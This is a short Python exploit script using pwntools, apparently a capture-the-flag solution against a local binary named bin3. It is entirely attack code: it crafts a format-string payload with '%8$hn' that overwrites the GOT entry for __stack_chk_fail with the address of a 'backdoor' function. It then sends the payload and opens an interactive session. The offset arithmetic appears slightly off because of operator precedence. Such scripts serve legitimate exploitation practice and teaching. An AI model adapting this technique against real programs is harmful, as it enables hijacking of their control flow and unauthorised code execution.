from pwn import *
#context.log_level='debug'
elf = ELF('./bin3')
io = process('./bin3')
stack_fail = elf.got['__stack_chk_fail']

payload = 'AAAAA' + '%' + str(elf.symbols['backdoor']&0xFFFF-5) + 'c' + '%8$hn' + p64(stack_fail)
payload = payload.ljust(0x58, 'A')

io.send(payload)
io.interactive()